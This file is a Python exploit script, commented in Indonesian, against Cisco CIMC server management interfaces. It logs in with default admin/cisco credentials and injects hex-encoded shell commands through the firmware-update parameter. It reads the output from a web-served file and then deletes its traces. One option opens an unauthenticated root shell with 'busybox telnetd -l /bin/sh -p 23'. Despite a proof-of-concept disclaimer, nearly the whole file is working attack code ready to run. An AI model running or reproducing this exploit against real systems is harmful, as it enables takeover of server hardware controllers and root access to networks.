#!/usr/bin/python3

import Crypto.Random
import Crypto.Cipher
import base64
import hashlib
import hmac
import requests
import urllib3
from Crypto.Cipher import AES
import urllib.parse
import re
import xml.etree.ElementTree as ET
import argparse
import random
import time
# ======================================== # 
# Atur ke "127.0.0.1:8080" untuk menggunakan proxy
proxy = None

# derrived dari /lib/thirdparty/thirdparty.js
def hashFnv32(a, b):
	b = bytes(b, encoding='ascii')
	e = 40389
	h = a[0:32]
	f = len(h)//4
	for i in range (0, f):
		e = e ^ ord(a[i])
		e = e + (e << 1)
	return hmac.new(bytes(str(e), encoding='ascii'), b, hashlib.sha512).hexdigest()

# derrived dari /lib/thirdparty/thirdparty.js
def keyFnv32(a):
	e = 40389
	h = a[0:32]
	f = len(h)//4
	for i in range (0, f):
		e = e ^ ord(a[i])
		e = e + (e << 1)
	e = str(e)
	return e

# derrived dari CryptoJS
def derive_key_and_iv(secret):
	salt = Crypto.Random.new().read(8)
	secret = bytes(secret, encoding='ascii')
	keylen = 32
	ivlen = 16
	secret += salt
	k = hashlib.md5(secret).digest()
	w = k 
	while len(w) < (keylen + ivlen):
		k = hashlib.md5(k + secret).digest()
		w += k
	return  w[:keylen], w[keylen:keylen+ivlen], salt

def pad(data):
	BLOCK_SIZE = 16
	return data+(BLOCK_SIZE-len(data)%BLOCK_SIZE)*chr(BLOCK_SIZE-len(data)%BLOCK_SIZE)
# ========================================
# derrived dari CryptoJS
def encrypt(username, password):
	secret = str(keyFnv32(username))
	msg = password
	key, iv, salt = derive_key_and_iv(secret)
	aes = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CBC, iv)
	padded_msg = bytes(pad(msg), encoding='ascii')
	encrypted_msg = aes.encrypt(padded_msg)
	return base64.b64encode(b"Salted__" + salt + encrypted_msg)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ===========================================================================================
def headers():
	print("""
     `````````'''$Ù+%y®kŸ92(VDS````````````````````````````````````````````````````     
    '''''''''''SDN“ÖèÞåÖbFFFbÿååà``¨```````````````````````````````````````````````````     
     ```````4Ü$Ùe”```````````1ÖÿÞ``````````````````````````````````````````````````     
     `````1ÚÚÚ/```````````````…–```````````````````````````````````````````````````     
     ````ùGð4``````````````````````````````````````````````````````````````````````````     
     `'DZJAD´````5ÆÆÆÆÆÆ“`````ZÆÆ``````ÆÆV``````ÆÆÆÆÆÆÆÆñ``````````````````````````````     
     `‹dp€d´```„ÆÆÃª``¿Æ¤``````ÆÆ¥````gÆÆ```````ÆÆ—````````````````````````````````````     
     `ýã€¶ŠU```ÆÆ@``````````````ÆÆ```¦ÆÆ````````ÆÆ—````````````````````````````````````     
     ``ëXéè````ÆÆ‚``````````````UÆÆ``ÆÆ‡````````ÆÆÆÆÆÆÆÆo``````````````````````````````     
     `SDNºƒ````ÆÆÏ```````````````ÆÆfpÆÚ`````````ÆÆ—````````````````````````````````````     
     ```nHŽ0```~ÆÆÆ{``JÆš````````´ÆÆÆÆ``````````ÆÆÑœœœœœJ``````````````````````````````     
     ````aÄÄh````òÆÆÆÆÆÆ~`````````(ÆÆ```````````ÆÆÆÆÆÆÆÆš``````````````````````````````     
     `````1EÁÁ<````````````````````````````````````````````````````````````````````````     
     `````` eNNÁø?``````````³gê¸```````````````````````````````````````````````````````     
     ```````''''ãNæÅBæEŽŽNNþÍ`4™'''''''''''''''''''''''''''''''''''''''''''''''''''''''`     
     `````````'''''iÝÕNÄðç‚``````````````````````````````````         
		""")
	print("~ Karena Setiap kerentanan Membutuhkan Alat Yang Keren    ~")
	print("~INSTARAM: ygarfynt._ |github:https://github.com/Yoga913 \n")
	print("Bukti konsep ini untuk tujuan demonstrasi dan tidak boleh digunakan untuk kegiatan ilegal,dan saya :@ygarfynt._ tidak bertanggung jawab atas segala tindakan penggunaan atau penyalahgunaan kode ini..")

# =================================================================================================
def login(target, username, password):
	enc_password = encrypt(username, password)

	req = requests.post(f"https://{target}/data/login",
		headers={'Referer':f'https://{target}/login.html','Accept-Encoding': 'identity'},
		proxies={"https":proxy,"http":proxy},
		verify=False,
		data={"user":username,"password":enc_password}
	)

	root = ET.fromstring(req.content)
	if root.find('authResult').text == '0':
		sidValue = root.find('sidValue').text
		adminUser = True if root.find('adminUser').text == '1' else False
		cookieValue = re.search('sessionCookie=([a-z0-9]{32});', req.headers['Set-Cookie']).group(1)
		print(f"sidValue: {sidValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX")
		print(f"cookieValue: {cookieValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX")
		print(f"Admin user: {adminUser}")
		return (True, cookieValue, sidValue, adminUser)
	else:
		return (False, None, None, None)

def logout(target, sidValue):
	print(f"Logging out: {sidValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX")
	req = requests.post(f"https://{target}/data/logout",
		headers={'Referer':f'https://{target}/index.html','Accept-Encoding': 'identity'},
		proxies={"https":proxy,"http":proxy},
		verify=False,
		data={"sessionID":sidValue}
	)
	return None
# =================================================================================================== 
def query(target, cookieValue, sidValue, input_cmd):
	res = query_raw(target, cookieValue, sidValue, input_cmd)
	return ET.fromstring(res.content)

def query_raw(target, cookieValue, sidValue, input_cmd):
	cmd = urllib.parse.quote(input_cmd)
	res = requests.post(f"https://{target}/data",
		headers={'Referer':f'https://{target}/index.html','Cookie':f'sessionCookie={cookieValue}','Cspg_var':hashFnv32(sidValue	,input_cmd),'Accept-Encoding': 'identity'},
		proxies={"https":proxy,"http":proxy},
		verify=False,
		data={"sessionID":sidValue,"queryString":cmd}
	)
	return res

def get_host_info(target, lreq):
	resp = query(target, lreq[1], lreq[2], 'get=sessionData')
	if resp.find("status").text == "ok":
		sessionData = resp.find("sessionData")
		print(f'cimcIp: {resp.find("cimcIp").text}')
		print(f'lzt: {sessionData.find("lzt").text}')
		print(f'sysPlatformId: {sessionData.find("sysPlatformId").text}')
		print(f'sessionId: {sessionData.find("sessionId").text}')
		print(f'canClearLogs: {sessionData.find("canClearLogs").text}')
		print(f'canAccessKvm: {sessionData.find("canAccessKvm").text}')
		print(f'canExecServerControl: {sessionData.find("canExecServerControl").text}')
		print(f'canConfig: {sessionData.find("canConfig").text}')
		print(f'intersightMode: {sessionData.find("intersightMode").text}')
		return resp
	else:
		print(resp.find("status").text)
		raise Exception("sessionData mengembalikan hasil yang aneh")
# ==================================================================================================== # 	
# v0.2 exec code
def exec(target, lreq, command):
	out_file = '/usr/local/www/in.html'
	tmp_cmd_file = '/tmp/cmd.sh'
	stager_cmd = f'sh < {tmp_cmd_file} > {out_file} 2>&1 || true'
	stager_cmd_file = '/tmp/stager.sh'
	MAX_COMMAND_LENGTH = 100
	command_split = [command[i:i+MAX_COMMAND_LENGTH] for i in range(0, len(command), MAX_COMMAND_LENGTH)]

	query_raw(target, lreq[1], lreq[2], f'set=expRemoteFwUpdate("1", "http","","$( >{tmp_cmd_file})")')
	for i_cmd in command_split:
		encoded_command = "\\\\x"+"\\\\x".join("{:02x}".format(ord(s)) for s in i_cmd)
		query_raw(target, lreq[1], lreq[2], f'set=expRemoteFwUpdate("1", "http","","$(echo -n -e \"{encoded_command}\" >> {tmp_cmd_file})")') 
	
	encoded_command = "\\\\x"+"\\\\x".join("{:02x}".format(ord(s)) for s in stager_cmd)
	query_raw(target, lreq[1], lreq[2], f'set=expRemoteFwUpdate("1", "http","","$(echo -n -e \"{encoded_command}\" > {stager_cmd_file})")')

	query_raw(target, lreq[1], lreq[2], f'set=expRemoteFwUpdate("1", "http","","$(sh {stager_cmd_file})")')

	web_file = out_file.split('/')[-1:][0]
	res = requests.get(f"https://{target}/{web_file}",
		headers={'Referer':f'https://{target}/index.html','Accept-Encoding': 'identity'},
		proxies={"https":proxy,"http":proxy},
		verify=False,
		stream=True
	)
	if res.status_code == 200:
		query_raw(target, lreq[1], lreq[2], f'set=expRemoteFwUpdate("1", "http","","$(rm -f {tmp_cmd_file} {stager_cmd_file} {out_file})")')
		out = res.raw.read()
		return str(out, encoding='utf-8')
	else:
		return None
# ============================================================================================================ # 
if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-t","--host", type=str, help="Nama host atau alamat IP target (format 10.0.0.1 atau 10.0.0.2:1337)", required=True)
	parser.add_argument("-u","--username", type=str,  default="admin", help="Nama Penggunna (default: admin)", required=True)
	parser.add_argument("-p","--password", type=str,  default="cisco", help="Kata sandi (default: cisco)", required=True)
	parser.add_argument("-a","--action", type=str, default="test", help="Tindakan: test, cmd, shell, dance💡 (default: test)")
	parser.add_argument("-c","--cmd", type=str, default="", help="Perintah OS untuk dijalankan (Default: NONE)")
	parser.add_argument("-v","--verbose", default=False, action='store_true', help="Menampilkan informasi lebih lanjut tentang cimc")
	args = parser.parse_args()

	if not args.cmd == "":
		args.action = "cmd"

	headers()
	print("")
	print(f"Mencoba masuk sebagai: {args.username}\n")
	lreq = login(args.host, args.username, args.password)
	if lreq[0]:
		print("Login: berhasil\n")
		if args.verbose:
			print("Mengumpulkan info CIMC:")
			get_host_info(args.host,lreq)
			print("")

		if args.action == "test":
			print("Action: test")
			test_num = random.randint(1111,9999)
			test_results = exec(args.host, lreq, f'echo -n {str(test_num)}')

			if test_results:
				if (str(test_num) in str(test_results)):
					print(f"🟩 Berhasil! {test_num} diberikan, {str(test_results)} dikembalikan")

				else:
					print("🟥 Tidak bisa mengeksploitasi kerentanan! File respons ada tetapi output tidak cocok")

			else:
				print("🟥 Tidak bisa mengeksploitasi kerentanan! Tidak dapat melihat output di server web")

		elif args.action == "cmd":
			print(f"Action: cmd")
			print(f"CIMC:/$ {args.cmd}")
			out = exec(args.host, lreq, args.cmd)
			if out:
				print(out)
			else:
				print("Ada yang tidak beres")

		elif args.action == "shell":
			print(f"Action: shell")
			print("Peringatan: Ini akan membuka port 23 pada antarmuka Cisco CIMC yang terhubung ke jaringan.\n Shell akan menyediakan akses root tanpa otentikasi.")
			c = input("Ketik 'y' untuk melanjutkan: ")
			if c.lower() == "y" or c.lower() == "yes":
				print(f"CIMC:/$ busybox telnetd -l /bin/sh -p 23\n")
				exec(args.host, lreq, "busybox telnetd -l /bin/sh -p 23")
				print(f"Please run: telnet {args.host}")
			else:
				print("Konfirmasi tidak diberikan")

		elif args.action == "dance":
			exec(args.host, lreq, "sh -c 'for i in 1 2 3 4 5 6 7 8 9 10; do /etc/plumas1/etc/scripts/LED.sh ON && sleep 0.1 && /etc/plumas1/etc/scripts/LED.sh OFF && sleep 0.1; done'") # # hanya bekerja dengan exec v0.2
			
			print("\\^o^/", end="\r")
			for i in range(0, 8):
				print("\\^o^/", end="\r")
				time.sleep(0.5)
				print("/^o^\\", end="\r")
				time.sleep(0.5)
			print("/^o^\\")
			
		else:
			print("Action: unknown")

		logout(args.host, lreq[2])
	else:
		print("Login: unsuccessful")

